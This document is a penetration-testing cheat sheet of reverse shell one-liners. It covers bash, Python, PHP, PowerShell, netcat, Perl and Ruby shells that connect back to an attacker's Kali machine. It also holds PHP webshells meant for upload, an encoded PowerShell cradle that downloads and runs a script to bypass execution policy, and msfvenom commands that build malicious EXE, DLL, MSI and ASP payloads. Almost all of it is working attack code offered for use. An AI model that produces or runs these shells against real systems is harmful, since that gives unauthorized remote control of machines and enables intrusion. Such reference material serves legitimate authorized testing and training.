# Reverse Shells

> **Kali listener always:** `nc -lvnp <PORT>`

**Online generator:** https://www.revshells.com

---

## Bash

```bash
bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1

# Encoded (avoids special char issues)
echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" | base64 | xargs -I{} bash -c "echo {} | base64 -d | bash"
```

---

## Python

```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<KALI-IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI-IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## PHP

```php
php -r '$sock=fsockopen("<KALI-IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP webshell (upload this)
<?php system($_GET['cmd']); ?>

# Full reverse shell webshell
<?php $sock=fsockopen("<KALI-IP>",<PORT>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>
```

---

## PowerShell

```powershell
# One-liner
powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('<KALI-IP>',<PORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Encoded (bypass execution policy)
powershell -EncodedCommand <BASE64-ENCODED-COMMAND>

# Generate encoded command on Kali
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://<KALI>/<script>")' | iconv -t UTF-16LE | base64 -w 0
```

---

## Netcat

```sh
# Standard (if -e flag supported)
nc -e /bin/bash <KALI-IP> <PORT>

# Without -e flag (use mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI-IP> <PORT> > /tmp/f

# Windows
nc.exe -e cmd.exe <KALI-IP> <PORT>
```

---

## Perl

```perl
perl -e 'use Socket;$i="<KALI-IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("<KALI-IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## MSFvenom Payloads

```sh
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f elf > shell.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f exe > shell.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f dll > evil.dll

# PHP
msfvenom -p php/reverse_php LHOST=<KALI-IP> LPORT=<PORT> -f raw > shell.php

# ASP (IIS)
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f asp > shell.asp

# MSI (Windows installer)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -f msi > evil.msi
```

---

## Shell Upgrade (TTY)

After getting a basic shell:

```sh
# Python TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# OR
python -c 'import pty;pty.spawn("/bin/bash")'

# Then background it: Ctrl+Z
stty raw -echo; fg

# Set terminal size
export TERM=xterm
stty rows 50 cols 200
```
